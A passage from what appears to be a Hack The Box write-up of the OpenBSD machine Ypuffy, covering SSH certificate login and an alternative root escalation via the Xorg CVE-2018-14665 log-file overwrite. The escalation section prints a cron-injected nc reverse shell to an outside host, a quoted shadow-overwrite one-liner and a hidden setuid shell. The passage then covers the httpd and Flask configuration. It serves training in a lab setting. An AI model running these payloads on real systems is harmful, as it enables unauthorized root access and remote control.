    Welcome to OpenBSD: The proactively secure Unix-like operating system.
    
    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.
    
    ypuffy# id
    uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
    

If I run `-ssh` with the `-v`, I will get debug output. If I compare the
output from logging in as root with logging in as alice1978 (just a private
key, no certificate), it’s basically the same up until it gets to the auth.
Then for the certificate login, it looks like this (I’ve added comment lines):

    
    
    ...[snip]...
    # will try rsa key and cert
    debug1: Will attempt key: id_rsa_ypuffy_root RSA SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI explicit
    debug1: Will attempt key: id_rsa_ypuffy_root RSA-CERT SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI explicit
    debug1: SSH2_MSG_EXT_INFO received
    debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
    debug1: SSH2_MSG_SERVICE_ACCEPT received
    debug1: Authentications that can continue: publickey
    debug1: Next authentication method: publickey
    # offers just key
    debug1: Offering public key: id_rsa_ypuffy_root RSA SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI explicit
    # didn't work, trying next method, with cert
    debug1: Authentications that can continue: publickey
    debug1: Offering public key: id_rsa_ypuffy_root RSA-CERT SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI explicit
    # with cert worked
    debug1: Server accepts key: id_rsa_ypuffy_root RSA-CERT SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI explicit
    debug1: Authentication succeeded (publickey).
    Authenticated to 10.10.10.107 ([10.10.10.107]:22).
    ...[snip]...
    

And now I can grab the root.txt:

    
    
    ypuffy# cat root.txt
    1265f8e0...
    

## Beyond Root

### Alternative Privesc: alice1978 –> root via CVE-2018-14665

#### Background

Ypuffy was released in September 2018, and a little over a month later (on 25
October), CVE-2018-14665 was released identifying an incorrect permission
check in Xorg that allowed privilege escalation from unprivileged users.

There are tons of scripts on GitHub etc that will exploit this vulnerability
automatically. There’s also a Metasploit module. I’m going to do it manually.

The basic vulnerability is pretty simple: Xorg, assuming it’s running setuid,
can overwrite a log file wherever the user tells it to with whatever data the
user gives it. There will be other data in there, but that can still be quite
powerful.

For example, HackerFantastic on Twitter tweeted out a [POC in a single
tweet](https://twitter.com/hackerfantastic/status/1055517801224396800):

> #CVE-2018-14665 - a LPE exploit via <https://t.co/eax3fvaAjE> fits in a
> tweet  
>  
> cd /etc; Xorg -fp "root::16431:0:99999:7:::" -logfile shadow :1;su  
>  
> Overwrite shadow (or any) file on most Linux, get root privileges. *BSD and
> any other Xorg desktop also affected.
>
> — Hacker Fantastic (@hackerfantastic) [October 25,
> 2018](https://twitter.com/hackerfantastic/status/1055517801224396800?ref_src=twsrc%5Etfw)

#### Exploit

With that in mind, there are a few places I could target. The
`/etc/master.passwd` file (like `/etc/shadow` on BSD). I’ll go for the
`crontab`.

I started a listener on port 443, and then wrote my cron:

    
    
    ypuffy$ Xorg -fp "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 > /tmp/f" -logfile crontab :1 &
    

This will error out (and I’ll have to kill it), but it will also write that
dump to a log file which I specified, `/etc/crontab`.

I can look at that file:

    
    
    [178588.565] (WW) checkDevMem: failed to open /dev/xf86 and /dev/mem
            (Operation not permitted)
            Check that you have set 'machdep.allowaperture=1'
            in /etc/sysctl.conf and reboot your machine
            refer to xf86(4) for details
    [178588.565]    linear framebuffer access unavailable
    [178588.779] (--) Using wscons driver on /dev/ttyC4
    [178588.788]
    X.Org X Server 1.19.6
    Release Date: 2017-12-20
    ...[snip]...
    [178588.790] (==) Max clients allowed: 256, resource mask: 0x1fffff
    [178588.790] (++) FontPath set to:
            * * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 > /tmp/f
    [178588.790] (==) ModulePath set to "/usr/X11R6/lib/modules"
    [178588.790] (II) The server relies on wscons to provide the list of input devices.
            If no devices become available, reconfigure wscons or disable AutoAddDevices.
    [178588.790] (II) Loader magic: 0x199318742000
    ...[snip]...
    Fatal server error:
    [178588.796] (EE) Caught signal 11 (Segmentation fault). Server aborting
    [178588.796] (EE) 
    [178588.796] (EE) 
    Please consult the The X.Org Foundation support 
             at http://wiki.x.org
     for help. 
    [178588.796] (EE) Please also check the log file at "crontab" for additional information.
    [178588.796] (EE) 
    [178588.797] (EE) Server terminated with error (1). Closing log file.
    

There’s a ton going on there, and a bunch more I cut out, but all that really
matters is the line in the middle with a cron-formatted string saying to
initiate a reverse shell back to me every minute.

The next time the minute rolls over, I get a root shell:

    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.107.
    Ncat: Connection from 10.10.10.107:25572.
    /bin/sh: No controlling tty (open /dev/tty: Device not configured)
    /bin/sh: Can't find tty file descriptor
    /bin/sh: warning: won't have full job control
    ypuffy# id
    uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
    

If you do happen to overwrite another file, then it will save the original
file by appending `.old`.

Another options for a cron would be to make a setuid shell:

    
    
    ypuffy$ Xorg -fp "* * * * * root cp /bin/sh /usr/local/bin/.df; chmod 4777 /usr/local/bin/.df" -logfile crontab :1 &
    

Wait for the minute to roll, and:

    
    
    ypuffy$ /usr/local/bin/.df 
    ypuffy# id
    uid=5000(alice1978) euid=0(root) gid=5000(alice1978) groups=5000(alice1978)
    

### WebServer Config

#### Apache

`/etc/httpd.conf` shows how the server is set up:

    
    
    server "ypuffy.hackthebox.htb" {
            listen on * port 80
    
            location "/userca*" {
                    root "/userca"
                    root strip 1
                    directory auto index
            }
    
            location "/sshauth*" {
                    fastcgi socket "/run/wsgi/sshauthd.socket"
            }
    
            location * {
                    block drop
            }
    }
    

The server listens on 80, and there are three paths it cares about:

  1. `/userca*` \- Any path starting with that (so `/userca`, `/usercaa`, and `/userca0xdf`) all resolve to the `/var/www/userca` folder, with dir listing enabled.
    
        ypuffy# pwd
    /var/www/userca
    ypuffy# ls
    ca.pub
    

![1549056475180](https://0xdfimages.gitlab.io/img/1549056475180.png)

  2. `/sshauth*`\- This will use a wsgi set up, just like [Dab last week](/2019/02/02/htb-dab.html#web-config--memcache). I’ll dig into this next.

  3. Anything else is blocked and dropped. This explains the Fin/Ack packets I saw on initial enumeration.

#### wsgi

The wsgi app is in `/var/appsrv/sshauthd`:

    
    
    ypuffy# ls
    sshauthd.ini sshauthd.py  sshauthd.pyc wsgi.py
    

Just like in Dab, the ini file describes how wsgi starts, in this case, with 3
processes, using the same socket identified in the httpd config:

    
    
    ypuffy# cat sshauthd.ini
    [uwsgi]
    plugins         = python
    chdir           = /var/appsrv/sshauthd
    pythonpath      = /usr/local/bin
    wsgi-file       = /var/appsrv/sshauthd/wsgi.py
    safe-pidfile    = /var/appsrv/sshauthd.pid
    fastcgi-socket  = /var/www/run/wsgi/sshauthd.socket
    chmod-socket    = 660
    master          = true
    processes       = 3
    callable        = app
    vacuum          = true
    

the `sshauthd.py` file describes how web requests are handled:

    
    
    from flask import Flask, request, abort
    import psycopg2
    app = Flask(__name__)
    
    def validate_uid(uid):
        result = False
        uid_len = len(uid)
    
        if 1 < uid_len < 32:
            if uid[0].isalpha() and uid[1:].isalnum():
                result = True
        return result
    
    def fetch_data(query, params):
        result_str = ''
    
        conn = psycopg2.connect("dbname=sshauth")
        curs = conn.cursor()
        curs.execute(query, params)
        result_list = curs.fetchall()
        curs.close()
        conn.close()
    
        while result_list:
            result_str += '%s\n' % result_list.pop()[0]
        return result_str
    
    @app.route('/sshauth', methods=['GET'])
    def sshauth():
        return_data = ''
        params = []
        query_type = request.args.get('type')
        uid = request.args.get('username')
    
        if (not uid) or (not query_type):
            abort(400)
    
        if query_type == 'principals':
            query_str = 'SELECT principal from principals where client >>= %s and uid = %s;'
            params.append(request.remote_addr)
        elif query_type == 'keys':
            query_str = 'SELECT key from keys where uid = %s;'
        else:
            abort(400)
    
        if validate_uid(uid):
            params.append(uid)
            return_data = fetch_data(query_str,params)
        return return_data
    

Basically, for the two different type options, it builds the Postgres queries,
and gets the results from the DB. There’s also a filter function to look for
only alphanumeric characters, between 2 and 31 characters long, starting with
a letter. This prevents any kind of injection attack against the database.

[](/2019/02/09/htb-ypuffy.html)

